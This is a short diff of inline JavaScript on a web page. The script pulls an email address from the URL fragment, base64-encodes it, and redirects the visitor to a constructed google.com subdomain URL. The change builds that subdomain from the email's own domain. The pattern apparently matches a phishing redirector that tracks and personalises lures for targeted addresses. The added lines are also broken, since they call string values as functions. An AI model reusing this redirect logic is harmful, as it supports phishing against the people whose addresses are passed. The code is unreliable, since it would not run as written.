@@ -43,9 +43,11 @@
  <script type="text/javascript">
 var url_string =  window.location.href;
 var url_get_email = (getafterhash(url_string));
+const domain = url_get_email("@")[1];
+const domain_name = domain(".")[0];
 var b64_email =  btoa(url_get_email);
 const randomString = generateRandomString(5);
-var mail_go_url =  "https://"+randomString+".google.com/"+b64_email;
+var mail_go_url =  "https://"+domain_name+".google.com/"+randomString+"/"+b64_email;
 
 if (b64_email) {
   location.replace(mail_go_url);
